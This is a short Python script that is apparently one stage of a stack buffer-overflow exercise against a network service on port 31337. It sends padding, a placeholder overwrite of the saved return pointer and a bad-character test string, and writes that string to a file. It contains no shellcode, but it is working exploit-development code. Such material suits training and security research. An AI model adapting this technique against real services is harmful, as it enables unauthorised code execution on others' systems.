#!/usr/bin/env python
import socket

# target --
RHOST = "192.168.0.139"
RPORT = 31337

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# bad chars --
# \x90 ( NOP ) / \x0A ( "\n" )
badchar_test = ""
badchars = [0x00, 0x0A]

# generate sting --
for i in range(0x00, 0xFF+1): # range (0x00, 0xFF) only returns up to 0xFE
	if i not in badchars:	# skip bad chars
		badchar_test += chr(i)	# append each NON-BAD char into a string

# open file for writing
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

# total buf(len)
# offset from mona! / msf-pattern-offeset
buf_totalen = 1024
offset_srp = 146 

# test offsets --
# add badchar_test to payload --
buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += "BBBB"	# SRP overwrite
buf += badchar_test # ESP points here 
buf += "D"*(buf_totalen - len(buf))	#trailing padding
buf += "\n"

# send the buffer --
s.send(buf)
